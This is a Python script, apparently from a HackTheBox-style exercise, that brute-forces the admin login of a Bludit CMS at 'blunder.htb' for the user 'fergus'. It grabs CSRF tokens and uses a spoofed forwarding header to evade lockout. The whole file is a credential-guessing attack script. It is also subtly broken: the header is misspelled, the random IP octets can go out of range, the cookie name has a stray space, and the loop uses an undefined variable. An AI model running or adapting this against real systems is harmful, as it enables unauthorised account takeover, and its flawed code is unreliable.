#! /usr/bin/python3

import requests
import re
import random

#Declaration of the Variables
HOST = 'blunder.htb'
USER = 'fergus'
PROXY = {'http':'127.0.0.1:8080'} #Will pass the request through burp we can check and debug if something goes wrong

#Login Module
def login(user,password):
	
	#Grabbing the CSRF Token and Cookie
	r = requests.get(f'http://{HOST}/admin/')
	csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text) #The cookie seemed to be hexadecimal,so we used the [a-f0-9] regex
	csrf = csrf.group(1)
	cookie = r.cookies.get('BLUDIT-KEY')
	
	#Declaring the X-Forwarded-For Header
	headers = {
			'X-Forwarder-For': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
	}
	
	#Post data for login request
	data = {
			'tokenCSRF':csrf,
			'username':user,
			'password':password,
			'save':''
	}
	cookies = {
			' BLUDIT-KEY': cookie
	}

	#Sending the Login Request
	r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, headers=headers, allow_redirects=False, proxies=PROXY)
	
	#Chelcs if the password is correct ot not
	if r.status_code !=200:
		print(f"{USER}:{password}")
		return True
	elif "password incorrect" in r.text:
		return False

#Brruteforce
wordlist = open('wordlist.txt').readlines()
for line in wl:
	line=line.strip()		
	login ('fergus',line)
